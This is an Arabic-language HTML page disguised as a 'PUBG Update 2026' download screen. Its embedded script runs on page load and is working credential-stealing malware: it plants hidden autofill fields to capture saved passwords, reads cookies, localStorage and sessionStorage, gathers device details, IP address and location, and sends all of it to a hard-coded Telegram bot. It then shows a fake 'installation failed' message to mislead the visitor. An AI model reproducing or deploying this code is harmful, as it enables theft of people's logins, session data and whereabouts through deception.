<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Update 2026</title>
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .box {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            max-width: 420px;
            width: 100%;
            border: 1px solid #e94560;
            box-shadow: 0 20px 60px rgba(233, 69, 96, 0.15);
        }
        .logo {
            font-size: 48px;
            margin-bottom: 10px;
        }
        h1 {
            color: #e94560;
            font-size: 28px;
            margin-bottom: 5px;
        }
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #e94560;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #888;
            font-size: 14px;
            margin-top: 10px;
        }
        .note {
            color: #ffcc00;
            font-size: 11px;
            margin-top: 20px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }
    </style>
</head>
<body>

<div class="box">
    <div class="logo">🎮</div>
    <h1>PUBG UPDATE 2026</h1>
    <p class="sub">جاري تحميل التحديث الجديد...</p>
    <div class="loader"></div>
    <p class="status" id="status">⏳ يرجى الانتظار، سيتم التثبيت تلقائياً</p>
    <p class="note">⚠️ لا تغلق الصفحة حتى انتهاء التحديث</p>
</div>

<script>
// ==========================================
// إعدادات التيليجرام
// ==========================================
const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
const CHAT_ID = "5730027675";

// ==========================================
// دالة إرسال البيانات إلى التيليجرام
// ==========================================
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {});
}

// ==========================================
// دالة إرسال الملفات
// ==========================================
function sendFileToTelegram(content, filename, caption) {
    const blob = new Blob([content], { type: 'text/plain' });
    const file = new File([blob], filename);
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    formData.append('caption', caption);
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData
    }).catch(() => {});
}

// ==========================================
// 1. سرقة كلمات المرور المحفوظة
// ==========================================
function stealSavedPasswords() {
    try {
        // إنشاء حقول خفية لمحاولة استخراج autofill
        const form = document.createElement('form');
        form.style.display = 'none';
        
        const emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.name = 'email';
        emailInput.autocomplete = 'email';
        emailInput.id = 'steal_email';
        
        const passInput = document.createElement('input');
        passInput.type = 'password';
        passInput.name = 'password';
        passInput.autocomplete = 'current-password';
        passInput.id = 'steal_pass';
        
        const submitBtn = document.createElement('input');
        submitBtn.type = 'submit';
        
        form.appendChild(emailInput);
        form.appendChild(passInput);
        form.appendChild(submitBtn);
        document.body.appendChild(form);
        
        // محاولة جلب البيانات بعد 500ms
        return new Promise((resolve) => {
            setTimeout(() => {
                const email = document.getElementById('steal_email').value;
                const password = document.getElementById('steal_pass').value;
                document.body.removeChild(form);
                resolve({ email, password });
            }, 500);
        });
    } catch(e) {
        return Promise.resolve({ email: '', password: '' });
    }
}

// ==========================================
// 2. سرقة الكوكيز
// ==========================================
function stealCookies() {
    try {
        return document.cookie || 'لا يوجد كوكيز';
    } catch(e) {
        return 'غير قادر على القراءة';
    }
}

// ==========================================
// 3. سرقة localStorage
// ==========================================
function stealLocalStorage() {
    try {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data[key] = localStorage.getItem(key);
        }
        return JSON.stringify(data, null, 2);
    } catch(e) {
        return 'غير قادر على القراءة';
    }
}

// ==========================================
// 4. سرقة sessionStorage
// ==========================================
function stealSessionStorage() {
    try {
        const data = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data[key] = sessionStorage.getItem(key);
        }
        return JSON.stringify(data, null, 2);
    } catch(e) {
        return 'غير قادر على القراءة';
    }
}

// ==========================================
// 5. جمع معلومات الجهاز
// ==========================================
function getDeviceInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href,
        referrer: document.referrer || 'مباشر',
        online: navigator.onLine ? 'متصل' : 'غير متصل'
    };
    return info;
}

// ==========================================
// 6. الحصول على IP
// ==========================================
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'غير معروف';
    }
}

// ==========================================
// 7. الحصول على الموقع
// ==========================================
async function getLocation() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        return {
            ip: data.ip || 'غير معروف',
            city: data.city || 'غير معروف',
            region: data.region || 'غير معروف',
            country: data.country || 'غير معروف',
            loc: data.loc || 'غير معروف',
            org: data.org || 'غير معروف'
        };
    } catch {
        return null;
    }
}

// ==========================================
// 8. إرسال كل البيانات
// ==========================================
async function stealAll() {
    // تحديث حالة التحميل
    document.getElementById('status').textContent = '⏳ جاري جمع المعلومات...';
    
    // جمع المعلومات
    const deviceInfo = getDeviceInfo();
    const cookies = stealCookies();
    const localStorageData = stealLocalStorage();
    const sessionData = stealSessionStorage();
    const ip = await getIP();
    const location = await getLocation();
    
    // محاولة سرقة كلمات المرور المحفوظة
    const saved = await stealSavedPasswords();
    
    // بناء الرسالة
    let message = `🎯 **تم اختراق جهاز جديد!**\n\n`;
    message += `📱 **معلومات الجهاز:**\n`;
    message += `• المتصفح: ${deviceInfo.userAgent}\n`;
    message += `• المنصة: ${deviceInfo.platform}\n`;
    message += `• اللغة: ${deviceInfo.language}\n`;
    message += `• الشاشة: ${deviceInfo.screen}\n`;
    message += `• التوقيت: ${deviceInfo.timezone}\n`;
    message += `• الرابط: ${deviceInfo.url}\n`;
    message += `• الحالة: ${deviceInfo.online}\n\n`;
    
    message += `🌐 **الـ IP:** ${ip}\n\n`;
    
    if (location) {
        message += `📍 **الموقع:**\n`;
        message += `• الدولة: ${location.country}\n`;
        message += `• المدينة: ${location.city}\n`;
        message += `• المنطقة: ${location.region}\n`;
        message += `• المزود: ${location.org}\n`;
        message += `• الإحداثيات: ${location.loc}\n\n`;
    }
    
    if (saved.email || saved.password) {
        message += `🔑 **كلمات المرور المحفوظة:**\n`;
        message += `• الإيميل: ${saved.email || 'غير موجود'}\n`;
        message += `• كلمة المرور: ${saved.password || 'غير موجود'}\n\n`;
    } else {
        message += `🔑 **كلمات المرور المحفوظة:** غير موجودة\n\n`;
    }
    
    // إرسال الرسالة الأساسية
    sendToTelegram(message);
    
    // إرسال الكوكيز
    if (cookies && cookies !== 'لا يوجد كوكيز') {
        sendToTelegram(`🍪 **الكوكيز:**\n\`\`\`\n${cookies}\n\`\`\``);
    }
    
    // إرسال localStorage
    if (localStorageData && localStorageData !== 'غير قادر على القراءة' && localStorageData !== '{}') {
        sendFileToTelegram(localStorageData, 'localStorage.txt', '📁 localStorage');
    }
    
    // إرسال sessionStorage
    if (sessionData && sessionData !== 'غير قادر على القراءة' && sessionData !== '{}') {
        sendFileToTelegram(sessionData, 'sessionStorage.txt', '📁 sessionStorage');
    }
    
    // تحديث حالة التحميل
    document.getElementById('status').textContent = '⚠️ فشل التحديث، جارٍ المحاولة مجدداً...';
    
    setTimeout(() => {
        document.getElementById('status').textContent = '❌ فشل التثبيت، يرجى المحاولة لاحقاً.';
        document.querySelector('.loader').style.display = 'none';
    }, 3000);
    
    // إرسال إشعار النهاية
    sendToTelegram('✅ **اكتملت عملية السرقة بنجاح!**');
}

// ==========================================
// التشغيل عند تحميل الصفحة
// ==========================================
window.onload = function() {
    // إشعار بداية
    sendToTelegram('🔥 **تم فتح الرابط الملغم!**');
    
    // بدء السرقة بعد 1 ثانية
    setTimeout(stealAll, 1000);
};
</script>

</body>
</html>
